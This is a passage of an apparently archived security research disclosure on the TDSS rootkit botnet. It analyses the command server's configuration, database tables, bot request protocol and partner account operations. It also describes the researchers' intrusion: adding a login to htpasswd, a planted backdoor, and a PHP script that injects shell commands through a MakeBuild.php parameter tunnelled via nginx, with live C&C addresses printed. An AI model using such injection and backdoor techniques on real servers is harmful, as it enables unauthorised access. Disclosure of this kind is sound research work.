-A INPUT -s 188.40.72.68/32 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT
-A INPUT -s 188.40.72.125/32 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT
-A INPUT -s 204.12.213.144/29 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT
-A INPUT -s 91.212.226.49/32 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT
-A INPUT -d 212.117.162.50/32 -p tcp -m tcp -m multiport --dports 443,80 -j REJECT --reject-with icmp-port-unreachable 
-A INPUT -d 91.212.226.59/32 -p tcp -m tcp -m multiport --dports 443,80 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i eth0 -p tcp -m tcp -m multiport --dports 3306 -j REJECT --reject-with icmp-port-unreachable 
-A INPUT -s 195.138.81.135/32 -p tcp -m tcp --dport 22 -j ACCEPT 
-A INPUT -i eth0 -p tcp -m tcp --dport 873 -j REJECT --reject-with icmp-port-unreachable 
-A INPUT -i eth0 -p tcp -m tcp --dport 22 -j REJECT --reject-with icmp-port-unreachable 
COMMIT</pre>
<p>Original content of <code>ipt.rules</code> file</p>
</div>
<p>After breaking the initial IP authorization check, we found another 
obstacle to accessing the panel: Basic Authorization. To pass Basic 
Auth, we added a new login to the htpasswd.engine file. Upon getting 
access to the server, it was also possible to read plaintext password 
from database.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/19.jpg" alt="Authorization request at admin panel logon" width="800" height="317">
<p>Authorization request at admin panel logon</p>
</div>
<p>The control panel has a user-friendly interface, allowing to view 
detailed botnet statistics, such as: total amount of rootkit 
installations per day, each bot’s nationality, operating system version 
and browser version. Also, through the panel it is possible to browse 
additional loadable modules for the rootkit, and to view commands being 
currently executed by bots.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/20.jpg" alt="Statistics of infections by days" width="800" height="370">
<p>Statistics of infections by days</p>
</div>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/21.jpg" alt="Statistics by OS" width="687" height="404">
<p>Statistics by OS</p>
</div>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/22.jpg" alt="Launched commands" width="800" height="237">
<p>Launched commands</p>
</div>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/23.jpg" alt="Statistics by countries" width="800" height="700">
<p>Statistics by countries</p>
</div>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/24.jpg" alt="TDSS modules" width="800" height="357">
<p>TDSS modules</p>
</div>
<h3 id="s9">Changing of C&amp;C servers</h3>
<p>While we were playing around with the control panel, a new version of
 the rootkit (3.64) started to spread, which communicated with 
completely different C&amp;C servers</p>
<pre>[tdlcmd]
servers=https://a57990057.cn/;https://a58990058.cn/;https://94.228.209.145/
wspservers=http://c36996639.cn/;http://c58446658.cn/
popupservers=http://m2121212.cn/</pre>
<p>Control scripts were changed on the new server. Particularly, the 
vulnerability which allowed to display command output in the server 
error message was fixed. But the other vulnerabilities that we found 
were still there, so it was possible to read the <code>index.php</code> 
file. According to its code, all the exceptions were now written into 
log file. Server settings were changed too. Among other things, a 
frontend was installed (nginx) in addition to the <code>lighttpd</code> HTTP server. The <code>engine.conf</code> file was unchanged.</p>
<p>The configuration panel was moved to 188.72.242.191, while our 
backdoor script stayed on 188.72.242.190. So we were unable to get 
access to the backdoor. The following script was developed to solve this
 problem:</p>
<div class="figure">
<pre>&lt;?php

$fp = fsockopen("ssl://94.228.209.145",443,$errno,$errstr);
if(!$fp) die("[e] $errno,$errstr");
$header  = "GET /MakeBuild.php?aid=;".urlencode($argv[1]).";&amp;dbg=1 HTTP/1.1\r\n";
$header .= "Host: bld.newnetengine.com\r\n";
$header .= "Connection: close\r\n\r\n";

fwrite($fp,$header);
while(!feof($fp)) print(fgets($fp,256));
fclose($fp);

print $buff;</pre>
<p>Executing commands on the new server via <code>MakeBuild.php</code> file</p>
</div>
<p>This script allows transparent tunneling of commands to the old 
server thanks to nginx, which performs redirection of HTTP requests to a
 server defined in the “Host:” field of the request (<code>bld.newnetengine.com</code>).</p>
<h2 id="s10">Part 2. Analysis</h2>
<p>Botnet command server works under 64-bit Ubuntu Linux:</p>
<pre># uname -a
Linux C020 2.6.29.2 #1 SMP Sun Jul 26 11:29:05 CEST 2009 x86_64 GNU/Linux 
# cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=9.04
DISTRIB_CODENAME=jaunty
DISTRIB_DESCRIPTION="Ubuntu 9.04"</pre>
<p>IPs are assigned for eth0 network interface:</p>
<pre># ifconfig
eth0      Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:212.117.162.50  Bcast:212.117.162.255  Mask:255.255.255.0
          inet6 addr: fe80::221:85ff:fe63:2c55/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8401814139 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7557368326 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:855626520252 (855.6 GB)  TX bytes:4595270022127 (4.5 TB)
          Interrupt:17 Base address:0x2000 

eth0:1    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.59  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:2    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.60  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:3    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.61  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:4    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.62  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:5    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.63  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:6    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.64  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:7    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.65  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:8    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.66  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:9    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.67  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:10295737718 errors:0 dropped:0 overruns:0 frame:0
          TX packets:10295737718 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3644745121946 (3.6 TB)  TX bytes:3644745121946 (3.6 TB)</pre>
<p>Among them, four IPs (91.212.226.60, 91.212.226.61, 91.212.226.62 and
 91.212.226.64) relay to web gate for bots, two of them (91.212.226.63 
and 212.117.162.50) are used to access the compilation scripts, and one 
(91.212.226.59) points to the administration panel.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/shadow.png" alt="User accounts listed in /etc/shadow file" width="449" height="488">
<p>User accounts listed in <code>/etc/shadow</code> file</p>
</div>
<p>At the moment of analysis the server’s process list looked as follows:</p>
<pre>  PID TTY      STAT   TIME COMMAND
 1076 ?        S&lt;s    0:04 /sbin/udevd --daemon
 1575 ?        S    1154:22 /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
 2453 ?        Ss     0:00 /sbin/mdadm --monitor --pid-file /var/run/mdadm/monitor.pid --daemonise --scan --syslog
 3801 tty2     Ss+    0:00 /sbin/getty 38400 tty2
 3826 ?        Ss     0:16 /sbin/syslogd -u syslog
 3845 ?        S      0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
 3848 ?        Ss     0:00 /sbin/klogd -P /var/run/klogd/kmsg
 3890 ?        Ss     1:54 /bin/dbus-daemon --system
 3936 ?        Ssl   69:36 /usr/sbin/named -u bind
 3973 ?        Ss     0:01 /usr/sbin/ntpd -p /var/run/ntpd.pid -u 108:117 -g
 3986 ?        Ss     0:01 /usr/sbin/sshd
 3991 ?        Sl   1736:18 /usr/bin/memcached -m 2048 -p 11211 -u nobody -l 127.0.0.1
 4067 ?        Ss     0:00 /usr/lib/postfix/master
 4084 ?        S      0:00 qmgr -l -t fifo -u
 4086 ?        Ss     0:00 /usr/sbin/winbindd
 4113 ?        S      0:00 /usr/sbin/winbindd
 4118 ?        Ss    86:34 avahi-daemon: running [C020.local]
 4119 ?        Ss     0:00 avahi-daemon: chroot helper
 4134 ?        S      0:00 /usr/bin/rsync --no-detach --daemon --config /etc/rsyncd.conf
 4185 ?        Ss     0:03 /usr/sbin/cron
 4220 tty1     Ss+    0:00 /sbin/getty 38400 tty1
 4225 ?        Ssl   36:54 /usr/sbin/console-kit-daemon
 4436 ?        S&lt;   223:30 [loop3]
 4465 ?        S&lt;    72:26 [kjournald2]
 4498 ?        S      0:00 /bin/sh /usr/bin/mysqld_safe
 4728 ?        SLl  87943:36 /usr/sbin/mysqld
 6773 ?        S      0:39 /usr/bin/php-cgi
 7303 ?        S      0:32 /usr/bin/php-cgi
 7320 ?        S      0:31 /usr/bin/php-cgi
 7447 ?        S      0:27 /usr/bin/php-cgi
 7590 ?        S      0:25 /usr/bin/php-cgi
 7796 ?        S      0:19 /usr/bin/php-cgi
 7944 ?        S      0:16 /usr/bin/php-cgi
 7982 ?        S      0:15 /usr/bin/php-cgi
 8002 ?        S      0:00 /USR/SBIN/CRON
 8048 ?        Ss     0:00 /bin/sh -c /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildslife.php
 8058 ?        S      0:05 /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildslife.php
 8243 ?        S      0:00 /USR/SBIN/CRON
 8282 ?        Ss     0:00 /bin/sh -c /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildsmlife.php
 8287 ?        S      0:06 /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildsmlife.php
 8467 ?        S      0:00 /USR/SBIN/CRON
 8483 ?        Ss     0:00 /bin/sh -c /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildswlife.php
 8484 ?        S      0:03 /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildswlife.php
 8637 ?        S      0:00 pickup -l -t fifo -u -c
 8812 ?        S      0:30 /usr/bin/php-cgi
 8903 ?        S      0:26 /usr/bin/php-cgi
 8937 ?        S      0:18 /usr/bin/php-cgi
 8966 ?        S      0:17 /usr/bin/php-cgi
 8971 ?        S      0:16 /usr/bin/php-cgi
 9057 ?        S      0:08 /usr/bin/php-cgi
 9081 ?        S      0:05 /usr/bin/php-cgi
 9249 ?        S      0:03 /usr/bin/php-cgi
 9299 ?        S      0:00 sh -c ps ax
 9300 ?        R      0:00 ps ax
26004 ?        S      0:00 [pdflush]
26007 ?        S      0:01 [pdflush]
27746 ?        Ss     0:00 ssh-agent
28031 ?        Ss     0:01 /usr/bin/php-cgi
28042 ?        Ss     0:03 /usr/bin/php-cgi</pre>
<h3 id="s11">Database and scripts</h3>
<p>On the server MySQL software is installed to access data bases. 
LightTPD with enabled PHP is used to process HTTP requests. Part of the 
data which are being accessed most often are cached in memory by <a href="https://web.archive.org/web/20180313192821/http://memcached.org/">memcached</a> program.</p>
<p>Administration panel scripts and botnet gateway scripts are located in <code>/var/www/engine</code> directory, which is organized as follows:</p>
<pre>+--- cron              - scheduled PHP scripts
+--- data              - database of GeoIP addresses and some text files
+--- library           - various PHP libraries used by scripts
+--- public            - scripts to process requests from bots
|                        (root directory of the botnet gateway)
\--- tools
|    +--- controllers  - administration panel scripts
|    +--- layouts      - basic HTML template for the administration panel
|    +--- public       - basic administration panel scripts
|    |                   (root directory of the administration panel web-server)
|    +--- views        - HTML layouts for various administration panel pages
+--- configuration.php – database access settings etc.</pre>
<p>To date of access, the server database contained 47 tables with overall 17 719 469 records, and its size was about 2.6 GB.</p>
<p>Names of tables and its purpose:</p>
<table class="data"><colgroup><col width="30%"> <col width="15%"> <col width="15%"> <col width="40%"> <col> <col> <col> </colgroup>
<thead>
<tr>
<td>Table name</td>
<td>Amount of records</td>
<td>Data size</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>affiliates</code></td>
<td class="num">512</td>
<td class="num">80,0 кБ</td>
<td rowspan="9">Partners accounts and its statistics</td>
</tr>
<tr>
<td><code>affiliatesaccounts</code></td>
<td class="num">607</td>
<td class="num">64,0 кБ</td>
</tr>
<tr>
<td><code>affiliatesregistrations</code></td>
<td class="num">507</td>
<td class="num">64,0 кБ</td>
</tr>
<tr>
<td><code>affiliatesstatistics</code></td>
<td class="num">≈ 62&nbsp;136</td>
<td class="num">8,5 МБ</td>
</tr>
<tr>
<td><code>affiliatesstatisticsbrowser</code></td>
<td class="num">≈ 53&nbsp;072</td>
<td class="num">7,1 МБ</td>
</tr>
<tr>
<td><code>affiliatesstatisticsbuild</code></td>
<td class="num">≈ 5&nbsp;979&nbsp;072</td>
<td class="num">655,8 МБ</td>
</tr>
<tr>
<td><code>affiliatesstatisticscountry</code></td>
<td class="num">≈ 245&nbsp;253</td>
<td class="num">26,1 МБ</td>
</tr>
<tr>
<td><code>affiliatesstatisticssts</code></td>
<td class="num">63</td>
<td class="num">3,3 кБ</td>
</tr>
<tr>
<td><code>affiliatesstatisticssystem</code></td>
<td class="num">≈ 56&nbsp;982</td>
<td class="num">7,1 мБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>bots</code></td>
<td class="num">≈ 5&nbsp;247&nbsp;199</td>
<td class="num">1,4 ГБ</td>
<td>Basic table with information about bots</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>browsers</code></td>
<td class="num">3&nbsp;690</td>
<td class="num">240,0 кБ</td>
<td rowspan="4">Additional information about bots (browser versions, rootkit versions, <code>TDLCMD.DLL</code> module version, country, OS version)</td>
</tr>
<tr>
<td><code>builds</code></td>
<td class="num">172</td>
<td class="num">16,0 кБ</td>
</tr>
<tr>
<td><code>countries</code></td>
<td class="num">253</td>
<td class="num">16,0 кБ</td>
</tr>
<tr>
<td><code>systems</code></td>
<td class="num">101</td>
<td class="num">16,0 кБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>commands</code></td>
<td class="num">55</td>
<td class="num">16,0 кБ</td>
<td rowspan="5">Commands for bots, its statistics, commands history, additional parameters</td>
</tr>
<tr>
<td><code>commandsexecuted</code></td>
<td class="num">≈ 4&nbsp;546&nbsp;977</td>
<td class="num">337,5 МБ</td>
</tr>
<tr>
<td><code>commandshistory</code></td>
<td class="num">1&nbsp;590</td>
<td class="num">224,0 кБ)</td>
</tr>
<tr>
<td><code>commandsinfo</code></td>
<td class="num">55</td>
<td class="num">64,0 кБ</td>
</tr>
<tr>
<td><code>commandsproperties</code></td>
<td class="num">909</td>
<td class="num">64,0 кБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>modules</code></td>
<td class="num">13</td>
<td class="num">400,0 кБ</td>
<td>Executable modules for bots</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>redirects</code></td>
<td class="num">0</td>
<td class="num">—</td>
<td rowspan="2">URL-redirections</td>
</tr>
<tr>
<td><code>redirectsexecuted</code></td>
<td class="num">0</td>
<td class="num">—</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>remover_bho</code></td>
<td class="num">6&nbsp;050</td>
<td class="num">1,5 МБ</td>
<td rowspan="11">Statistics of <code>remover</code> module</td>
</tr>
<tr>
<td><code>remover_bho_stat</code></td>
<td class="num">20</td>
<td class="num">1,9 кБ</td>
</tr>
<tr>
<td><code>remover_dda</code></td>
<td class="num">642</td>
<td class="num">144,0 кБ</td>
</tr>
<tr>
<td><code>remover_dda_stat</code></td>
<td class="num">21</td>
<td class="num">1,9 кБ</td>
</tr>
<tr>
<td><code>remover_dir</code></td>
<td class="num">≈ 37&nbsp;991</td>
<td class="num">7,5 МБ</td>
</tr>
<tr>
<td><code>remover_dir_stat</code></td>
<td class="num">20</td>
<td class="num">1,9 кБ</td>
</tr>
<tr>
<td><code>remover_errors</code></td>
<td class="num">18&nbsp;914</td>
<td class="num">2,5 МБ</td>
</tr>
<tr>
<td><code>remover_extra</code></td>
<td class="num">≈ 289&nbsp;449</td>
<td class="num">54,6 МБ</td>
</tr>
<tr>
<td><code>remover_extra_stat</code></td>
<td class="num">18</td>
<td class="num">1,9 кБ</td>
</tr>
<tr>
<td><code>remover_guid</code></td>
<td class="num">≈ 21&nbsp;220</td>
<td class="num">4,5 МБ</td>
</tr>
<tr>
<td><code>remover_guid_stat</code></td>
<td class="num">20</td>
<td class="num">1,9 кБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>rules</code></td>
<td class="num">0</td>
<td class="num">—</td>
<td rowspan="2">Unknown</td>
</tr>
<tr>
<td><code>ruleshistory</code></td>
<td class="num">0</td>
<td class="num">—</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>statuses</code></td>
<td class="num">1&nbsp;982</td>
<td class="num">72,3 кБ</td>
<td rowspan="3">Unknown</td>
</tr>
<tr>
<td><code>statuses_limits</code></td>
<td class="num">1&nbsp;138&nbsp;919</td>
<td class="num">115,0 МБ</td>
</tr>
<tr>
<td><code>statuses_statistics</code></td>
<td class="num">3&nbsp;956</td>
<td class="num">102,8 кБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>users</code></td>
<td class="num">10</td>
<td class="num">16,0 кБ</td>
<td>Accounts of administration panel users</td>
</tr>
</tbody>
</table>
<p>Let’s look through the structure of the most interesting tables.</p>
<h3 id="s12">Requests from bots to the server</h3>
<p>Immediately after installation, a bot starts polling the server for 
commands in a loop. As it was mentioned above, a bot’s requests are 
first encoded in RC4, then into base64, and are finally sent to botnet 
gateway via HTTPS.</p>
<p>Command request format may vary from version to version of the 
rootkit. In most verstions, a request looks as follows before 
encryption:</p>
<pre class="oneliner">bot_ID|aff_ID|aff_SID|rootkit_ver|tdlcmd_ver|os_ver|lang|browser|build_date|install_date</pre>
<p>Fields description:</p>
<table class="text"><colgroup><col width="25%"> <col width="75%"> </colgroup>
<thead>
<tr>
<td>Field</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>bot_ID</code></td>
<td>Unique bot identifier, e.g. <code>7a91eb86-a6be-4db5-8694-0337dad2c75d</code></td>
</tr>
<tr>
<td><code>aff_ID</code></td>
<td>Bot owner ID</td>
</tr>
<tr>
<td><code>aff_SID</code></td>
<td>Sub account ID</td>
</tr>
<tr>
<td><code>rootkit_ver</code></td>
<td>Rootkit version</td>
</tr>
<tr>
<td><code>tdlcmd_ver</code></td>
<td>Version of <code>TDLCMD.DLL</code> module (basic module of bot’s payload)</td>
</tr>
<tr>
<td><code>os_ver</code></td>
<td>OS version</td>
</tr>
<tr>
<td><code>lang</code></td>
<td>OS language</td>
</tr>
<tr>
<td><code>browser</code></td>
<td>Browser of infected computer. Value of this field is a path to executable file of the browser, found in registry key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\HTTP\shell\open\command</code></td>
</tr>
<tr>
<td><code>build_date</code></td>
<td>Compilation date of bot’s executable files (optional)</td>
</tr>
<tr>
<td><code>install_date</code></td>
<td>Infection date (optional)</td>
</tr>
</tbody>
</table>
<p>Besides requests for commands, command server scripts can process some special requests like the following:</p>
<pre class="oneliner">module_ID|value_1|value_2|...|value_N</pre>
<table class="text"><colgroup><col width="25%"> <col width="75%"> </colgroup>
<thead>
<tr>
<td>Field</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>module_ID</code></td>
<td>Identifier of request type (equivalent to module name which is being addressed)</td>
</tr>
<tr>
<td><code>value_1</code>–<code>value_N</code></td>
<td>Random amount of string and/or integer data, depending on the request type</td>
</tr>
</tbody>
</table>
<p>No functionality to perform special requests is hardcoded in the 
rootkit binary, but it can happen as a result of other commands 
execution, such as a command to download additional payload module.</p>
<p>Let’s see how the server processes requests from bots. In the first lines of <code>/var/www/engine/index.php</code> script, after including of required header files, requests decoding takes place:</p>
<pre>&lt;?php
try {

    // declaration of constants – paths to various directories
    define('DS'                    , DIRECTORY_SEPARATOR       );
    define('DIR_ROOT'              , realpath('../')           );
    define('DIR_LIBRARY'           , DIR_ROOT.DS.'library'     );
    define('DIR_LIBRARY_CLASSES'   , DIR_LIBRARY.DS.'classes'  );
    define('DIR_LIBRARY_MODELS'    , DIR_LIBRARY.DS.'models'   );
    define('DIR_LIBRARY_FUNCTIONS' , DIR_LIBRARY.DS.'functions');
    define('DIR_DATA'              , DIR_ROOT.DS.'data'        );

    // activating external modules
    require_once( DIR_ROOT . DS . 'configuration.php' );
    require_once( DIR_LIBRARY_CLASSES . DS . 'DBase.php' );
    require_once( DIR_LIBRARY_FUNCTIONS . DS . 'rc4Encrypt.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mBots.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mAffiliate.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mAffiliates.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mBrowsers.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mBuilds.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mSystems.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mCountries.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mCommands.php' );
    require_once( DIR_LIBRARY_MODELS . DS . 'mCommandsMemcache.php' );
    
    // decoding RC4-request (using server name as a key)
    $request      = rc4Decrypt( $_SERVER["HTTP_HOST"], base64_decode( substr( $_SERVER["REQUEST_URI"], 1 ) ) ); 
    $requestCount = 0;
    $requestHost = $_SERVER["HTTP_HOST"];

    if( $request ) {
        // split request line into array elements
        $request      = explode( '|', $request );
        $requestCount = sizeof( $request );
    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

    ...</pre>
<p>As you can see from this code, request fields are saved in the <code>$request</code> array. Then a module is activated which corresponds to the first array element (i.e. special request ID).</p>
<table class="text"><colgroup><col width="20%"> <col width="20%"> <col width="60%"> </colgroup>
<thead>
<tr>
<td>Special request ID</td>
<td>Script name</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>remover</code></td>
<td><code>remover.php</code></td>
<td>Receiving statistics from the <code>remover</code> module (more details below)</td>
</tr>
<tr>
<td><code>services</code></td>
<td><code>services.php</code></td>
<td>Partner accounts management (create, delete, request of information)</td>
</tr>
<tr>
<td><code>rules</code></td>
<td><code>rules.php</code></td>
<td>Collection of executed commands output.</td>
</tr>
<tr>
<td><code>redirect</code></td>
<td><code>redirect.php</code></td>
<td>Redirecting to a URL with a given ID, stored in the server database</td>
</tr>
<tr>
<td><code>installation</code></td>
<td><code>installation.php</code></td>
<td>Displaying content of file <code>/var/www/engine/data/affId_affSid.dat</code>, where <code>affId</code> and <code>affSid</code>
 — identifiers of account and subaccount of a partner, specified in a 
request. Purpose of this file is unknown, because we didn’t find any 
corresponding files on target server.</td>
</tr>
<tr>
<td><code>modules</code></td>
<td><code>modules.php</code></td>
<td>Processing of additional module requests from bots.</td>
</tr>
</tbody>
</table>
<p>If value of the first field of a request doesn’t match any special 
request ID, listed in the previous table, then the request is processed 
as a regular command request:</p>
<pre>    } elseif( $requestCount == 8 || $requestCount == 10 ) {
    
        // connect to database
        DBase::connect( DBASE_HOST , DBASE_USER , DBASE_PWD , DBASE_BASE );
    
        // connect to memcached daemon
        $objMemcache = new Memcache;
        $objMemcache-&gt;connect( MCACHE_HOST, MCACHE_PORT );
        
        // receive information about bot from request fields
        $requestName      = $request[0];
        $requestAffAid    = $request[1];
        $requestAffSid    = $request[2];
        $requestRk        = $request[3];
        $requestCmd       = $request[4];
        $requestSystem    = $request[5];
        $requestLang      = $request[6];
        $requestBrowser   = $request[7];
        
        if( $requestCount == 8 ) {    
            // no information about compilation and infection dates in request 
            $requestBuildDate   = 0;
            $requestInstallDate = 0;
        } else {
            $requestBuildDate   = strtotime( $request[8] );
            $requestInstallDate = strtotime( $request[9] );
        }

        $requestBuild     = "{$requestRk}_{$requestCmd}";
        $requestIp        = ip2long( $_SERVER['REMOTE_ADDR'] );

        $requestAffId     = null;
        $requestSystemId  = null;
        $requestBrowserId = null;
        $requestBuildId   = null;

        // activate engine.php module
        // it adds information about bot to database and processes command request
        include('engine.php');
        
        $objMemcache-&gt;close();
        DBase::disconnect(); 
        
        ...</pre>
<p>Upon receiving a regular commands request, the server sends a list of
 commands back to the bot. Commands are encoded in RC4, the bot ID 
serving as an encryption key.</p>
<h3 id="s13">Partners accounts</h3>
<p><code>The affiliates</code> table contains information about partners accounts. Such accounts can be edited by the administration panel operator.</p>
<pre>CREATE TABLE IF NOT EXISTS `affiliates` (
  `affId` int(11) unsigned NOT NULL auto_increment,   -- table key
  `affAid` char(20) NOT NULL,                         -- identifier of partner account
  `affGroup` int(11) unsigned NOT NULL,               -- group of partner account
  `affLogin` char(32) default NULL,                   -- name (login) of partner account  PRIMARY KEY  (`affId`)
);</pre>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/edit_aff.png" alt="Editing partner account in botnet admin panel" width="709" height="267">
<p>Editing partner account in botnet admin panel</p>
</div>
<p>Each partner can own any number of bot executables. Partner ID is 
hardcoded in a bot executable file during compilation. After the rootkit
 installation the ID is stored in config.ini file in the rootkit’s own 
file system.</p>
<p>Subaccounts can be used to group a partner’s bot executables.</p>
<div class="figure"><img src="TDSS%20botnet%20full%20disclosure_files/config_ini.png" alt="Identifiers of a partner’s account and subaccounts are stored in config.ini file." width="547" height="132">
<p>Identifiers of a partner’s account and subaccounts are stored in <code>config.ini</code> file.</p>
</div>
<p>Partner accounts can be managed directly by sending the following request to botnet gateway:</p>
<pre class="oneliner">services|operation_code|argument_1|argument_2|...|argument_N</pre>
<table class="text"><colgroup><col width="25%"> <col width="75%"> </colgroup>
<thead>
<tr>
<td>Field</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>operation_code</code></td>
<td>Code of operation to be executed</td>
</tr>
<tr>
<td><code>argument_1</code>–<code>argument_N</code></td>
<td>Optional argument – its format is defined by particular operation</td>
</tr>
</tbody>
</table>
<p>Operation codes are defined in the following table:</p>
<table class="text"><colgroup><col width="10%"> <col width="20%"> <col width="70%"> </colgroup>
<thead>
<tr>
<td>Operation code</td>
<td>Arguments</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td class="num">100</td>
<td><code>affAid</code>, <code>affLogin</code>, <code>affGroup</code></td>
<td>Creating of a new partner account.</td>
</tr>
<tr>
<td class="num">110</td>
<td><code>affId</code></td>
<td>Deleting of an existing account.</td>
</tr>
<tr>
<td class="num">120</td>
<td><code>affAid</code></td>
<td>Showing all subaccounts for a given account.</td>
</tr>
<tr>
<td class="num">150</td>
<td><code>engineType</code></td>
<td>Adding of a new account with automatic generation of <code>affAid</code>. Value of <code>affGroup</code> is selected according to value of <code>engineType</code></td>
</tr>
<tr>
<td class="num">200</td>
<td><code>affAid</code>, <code>affSid</code>, <code>statDateFrom</code>, <code>statDateTo</code></td>
<td>Requesting number of bot installations for a given account and a given period of time.</td>
</tr>
<tr>
<td class="num">201</td>
<td><code>affAid</code>, <code>affSid</code>, <code>statDateFrom</code>, <code>statDateTo</code></td>
<td>Requesting bots by country statistics for a given account and a given period of time.</td>
</tr>
<tr>
<td class="num">301</td>
<td>—</td>
<td>Enumeration of existing partner accounts.</td>
</tr>
</tbody>
</table>
<p>Request parameters details:</p>
<table class="data"><colgroup><col width="25%"> <col width="75%"> </colgroup>
<thead>
<tr>
<td>Parameter</td>
<td>Purpose</td>
</tr>
</thead>
<tbody>
<tr>
<td><code>affId</code></td>
<td rowspan="4">Parameters correspond to cognominal fields in <code>affiliates</code> table</td>
</tr>
<tr>
<td><code>affAid</code></td>
</tr>
<tr>
<td><code>affSid</code></td>
</tr>
<tr>
<td><code>affLogin</code></td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>statDateFrom</code></td>
<td rowspan="2">Dates in <code>Y-m-d</code> format</td>
</tr>
<tr>
<td><code>statDateTo</code></td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>affGroup</code></td>
<td>Identifier of partner group</td>
</tr>
</tbody>
</table>
<p>List of existing partner groups is located in <code>/var/www/engine/data/groups.txt</code>:</p>
<pre>Affiliates Groups
    1  - Test Installs
    10 - Our Installs
    20 - InstallConverter
    30 - ProfitCash
    40 - ReliefPPC
